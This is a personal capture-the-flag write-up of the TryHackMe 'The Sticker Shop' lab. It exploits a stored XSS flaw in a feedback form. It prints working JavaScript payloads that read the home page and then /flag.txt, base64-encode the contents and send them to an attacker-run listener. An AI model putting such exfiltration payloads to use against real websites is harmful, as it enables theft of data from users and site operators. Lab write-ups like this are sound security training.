![image](https://github.com/user-attachments/assets/36bc4f91-87a2-4614-aeb5-e57bfe259a98)The Sticker Shop Tryhackme 09/12/2024  
(This is a personal writeup to be consulted later)  

This is the website of the challenge , to get the flag , we need to access http://10.10.250.141:8080/flag.txt  

![image](https://github.com/user-attachments/assets/963c3da6-f9a6-4d9e-badb-a4bad5f02f19)  

I can't click on the stickers.  
there is an input in the Feedback page:  
![image](https://github.com/user-attachments/assets/f8604228-6033-473e-a71d-d4b3e2cd23c1)  

It looks like there is an XSS vulnerability  
I set up for XSS , I prepare the listener :  
" sudo python3 -m http.server 80 "  
![image](https://github.com/user-attachments/assets/19232d56-7203-41ff-af91-32f030083f57)  

then I will use this XSS Payload in the feedback input :  
'<script>
fetch("/", {method:'GET',mode:'no-cors',credentials:'same-origin'})
  .then(response => response.text())
  .then(text => { 
    fetch('http://10.21.40.71:80/' + btoa(text), {mode:'no-cors'}); 
  });
</script>
'  
I got this response on the listener  
![image](https://github.com/user-attachments/assets/cd45fba8-1dd2-4e27-8c80-ab9c7b4c9440)  
I decode it using the command  
'echo "...." | base64 -d"  
I get this result  
<!DOCTYPE html>
<html>
<head>
    <title>Cat Sticker Shop</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        header {
            background-color: #333;
            color: #fff;
            text-align: center;
            padding: 10px;
        }
        header ul {
            list-style: none;
            padding: 0;
        }
        header li {
            display: inline;
            margin-right: 20px;
        }
        header a {
            text-decoration: none;
            color: #fff;
            font-weight: bold;
        }
        .content {
            padding: 20px;
        }
        .product {
            border: 1px solid #ccc;
            padding: 10px;
            margin: 10px;
            display: inline-block;
        }
    </style>
</head>
<body>
    <header>
        <ul>
            <li><a href="/">Home</a></li>
            <li><a href="/submit_feedback">Feedback</a></li>
        </ul>
    </header>
    <div class="content">
        <h1>Welcome to the Cat Sticker Shop!</h1>
        <div class="product">
            <img src="/static/images/cat_sticker_1.png" alt="Cat Sticker 1" width="300" height="300">
            <h2>Cat Sticker 1</h2>
            <p>Price: $2.99</p>
        </div>
        <div class="product">
            <img src="/static/images/cat_sticker_2.png" alt="Cat Sticker 2" width="300" height="300">
            <h2>Cat Sticker 2</h2>
            <p>Price: $3.99</p>
        </div>

    </div>
    <br>&nbsp;&nbsp;We only sell stickers at our physical store. Please feel free to stop by!
</body>
</html>

==> Then I will change my payload , to check the content of the flag.txt , as the hint is mentioned  
'<script>
fetch("/flag.txt", {method:'GET',mode:'no-cors',credentials:'same-origin'})
  .then(response => response.text())
  .then(text => { 
    fetch('http://10.21.40.71:80/' + btoa(text), {mode:'no-cors'}); 
  });
</script>'  
I got this response :  
![image](https://github.com/user-attachments/assets/64cce555-fffe-44e8-81da-ef3ac72b43e2)  
I decode it the same as before  :  
![image](https://github.com/user-attachments/assets/613e999e-e384-4857-956d-89d94bb49a2d)


